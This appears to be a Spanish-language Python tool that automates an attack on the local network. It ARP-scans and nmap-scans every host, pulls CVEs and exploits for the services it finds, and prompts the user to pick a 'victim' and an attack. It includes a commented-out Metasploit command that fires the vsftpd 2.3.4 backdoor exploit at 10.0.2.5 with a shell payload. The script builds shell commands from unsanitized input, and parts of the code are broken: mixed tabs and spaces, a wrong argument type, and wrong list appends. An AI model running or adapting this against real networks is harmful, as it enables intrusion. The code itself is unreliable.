# coding=utf-8
import sys, subprocess, os
import requests, json
from subprocess import call

def obtenerIpRed():
	#Obtenemos la IP del dispositivo
	ip_a = subprocess.getoutput("ip addr | grep 'inet ' | cut -d ' ' -f6 | awk 'NR==2'")
	print("ip_a : " + ip_a)
	#Lanzamos un escaneo a la red, para ello obtenemos la máscara a partir de la ip
	mascara_red = ip_a[-3:]
	ip = ip_a[0:len(ip_a)-3]
	print("Mascara: " + mascara_red + "\nIP: " + ip) 
	if (mascara_red == '/24'):
		#Si es /24 tendremos que cambiar los 8 últimos bits por cero, para ello invertimos la cadena
		#separamos una vez por puntos y lo guardamos en una variable en donde añadiremos el 0 y la máscara
		aux = ip[::-1].split('.', 1)[1]
		ip_red = aux[::-1] + '.0' + mascara_red
		return(ip_red)

def enumerarDispositivos(ip_red, diccionario):
    i=0
    print('Haciendo escaner de la red ' + ip_red)
    os.system('arp-scan ' + ip_red + ' > arp.txt')
    #os.system('cat arp.txt')
    os.system('head -n -3 arp.txt | awk "NR>2" > arp1.txt')
	#Abrimos el fichero y cada IP la metemos en un array
    with open("arp1.txt", "r") as f:
        for linea in f:
            line = linea.split('\t')
            diccionario.append({'Indice': i, 'IP': line[0], 'MAC': line[1], 'Fabricante': line[2] })
            i=i+1

def portScan(diccionario):
	nmap = []
	puerto = dict()
	for item in diccionario:
		os.system('nmap ' + item['IP'] + ' -oG test > nmap.txt')
		f = open("test", "r")
		fichero = f.readlines()
		f.close()
		os.system('rm test')
		line = fichero[2].split('\t')
		linePort = line[1].split(' ')
		lineaSinEsp = list(filter(lambda x: x!="", linePort))
		print(lineaSinEsp)
		if len(lineaSinEsp) >= 2:
			for i in range(1,len(linePort)):
				port = linePort[i].split('/')
				print(port)
				puerto = {'Puerto': port[0], 'STATE': port[1], 'Service': port[4], 'Protocol': port[2] }
				print(puerto)
				nmap.append(puerto)
				puerto = {}
			i=0
		item["nmap"] = nmap
		fichero = []
		nmap=[]

def buscarVuln(victima, vulnerabilidades):
	print(victima)
	for item in victima['nmap']:
		consultarVulnerabilidades(item['Service'], vulnerabilidades, victima)
        #Como puede haber muchas, vamos a imprimir solo las que tengan un BaseSeverityHigh
		cve_high = []
		for element in vulnerabilidades:
			if element['base severity'] == 'HIGH':
                cve_high.append(element)
		print("Number of vulnerabilities with Base Severity High " + str(len(cve_high)))
		imprimirAllList(cve_high)
		option = input("Seguir buscando vulnerabilidades (S/N): ")
		if len(cve_high) == 0:
			imprimirAllList(vulnerabilidades)
			print('\nNo se han encontrado más vulnerabilidades')
		if option == 'N' or option == 'n':
			print('\nPasamos a buscar exploits')
			break

def consultarVulnerabilidades(consulta, vulnerabilidades, victima):
    #Buscar por coincidencias en el nombre
    url = "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=" + consulta + "&keywordExactMatch"
    print(url)
    #Hacemos la consulta a la API
    response = requests.get(url)
    #Solo si la búsqueda es buena (200) continuaremos
    if response.status_code == 200:
        data = response.json()
        print(len(data))
        #Creamos el diccionario donde iremos guardando la información de cada vulnerabilidad
        cve = dict()
        cve.update({'totalResults': data['totalResults']})
        #Por cada vulnerabilidad almacenamos la información que nos interesa
        for element in data['vulnerabilities']:
            guardarVulnerabilidades(element, cve, vulnerabilidades)
        victima['vulnerabilidades'] = vulnerabilidades
        #Una vez tenemos todos las vulnerabilidades en la lista pasamos a imprimirlas y que el usuario escoja cuál explotar
        #imprimirBaseSeverityHigh(vulnerabilidades)
    else:
        #imprimimos el estado para ver el error
        print(response.status_code)

def guardarVulnerabilidades(data, cve, vulnerabilidades):
    cve.update({'id': data['cve']['id'], 'lastModified': data['cve']['lastModified'], 'description': data['cve']['descriptions'][0]['value']})
    for element in data['cve']['metrics']['cvssMetricV2']:
        cve = obtenerVersionBaseSeverity(element, cve)
    vulnerabilidades.append(cve)

def obtenerVersionBaseSeverity(data, dictionary):
    dictionary.update({'version': data['cvssData']['version'], 'base severity': data['cvssData']['baseSeverity'], 'vectorString': data['cvssData']['vectorString'], 'accessVector': data['cvssData']['accessVector'] })
    dictionary.update({'obtainAllPrivilege': data['obtainAllPrivilege'], 'obtainUserPrivilege': data['obtainUserPrivilege'], 'obtainOtherPrivilege': data['obtainOtherPrivilege']})
    return dictionary

def buscarExploits(victima, exploit):
	print(victima)
	for item in victima['nmap']:
		consultarExploits(item['Service'], exploit, victima)
		option = input("Seguir buscando vulnerabilidades (S/N): ")
		if option == 'N' or option == 'n':
	        	break
		elif option == 'S' or option == 's': 
			try:
				exp = subprocess.getoutput("searchsploit " + item['Service'])
				print(exp)
			except:
				print("No se han encontrado más exploits")

def consultarExploits(title, exploit, victima):
    url = "https://www.exploitalert.com/api/search-exploit?name=" + title
    print(url)
    #Hacemos la consulta a la API
    response = requests.get(url)
    #Solo si la búsqueda es buena (200) continuaremos
    if response.status_code == 200:
        data = response.json()
        print(len(data))
        for item in data:
            exploit.append(data)
        victima['exploits'] = exploit
    else:
        print(response.status_code)

def atacar(victima):
	ataque = input("Atacar por vulnerabilidad (V) o por exploit (E): ")
	if ataque == "V" or ataque == "v":
		print(victima["vulnerabilidades"])
		num = int(input("Escoja el índice de la vulnerabilidad a atacar: "))
	elif ataque == "E" or ataque == "e":
		print(victima["exploits"])
		num = int(input("Escoja el índice del exploit a atacar: "))
	else:
		print("La selección no es válida")
	#os.system('msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set RHOSTS 10.0.2.5; set PAYLOAD cmd/unix/interact; run"')

def imprimirFirstThree(vulnerabilidades):
    for i in range(3):
        print(vulnerabilidades[i])    

def imprimirAllList(vulnerabilidades):
    for element in vulnerabilidades:
        print(element)
        print()


enumeracion = []
vulnerabilidades = []
exploits = []
ip_red=obtenerIpRed()
enumerarDispositivos(ip_red, enumeracion)
print('arp-scan terminado, dispositivos encontrados')
#print(imprimirAllList(enumeracion))
portScan(enumeracion)
print('\n\nnmap terminado, dispositivos encontrados')
print(imprimirAllList(enumeracion))
victima = int(input("Elegir objetivo (introduce el índice): "))
print('\n\nEmpezando la búsqueda de vulnerabilidades para su explotación')
objetivo = buscarVuln(enumeracion[victima], vulnerabilidades)
buscarExploits(enumeracion[victima], exploits)
print(enumeracion)
print("\n\nElegir ataque contra " + enumeracion[victima]["IP"])
atacar(enumeracion[victima]['IP'])
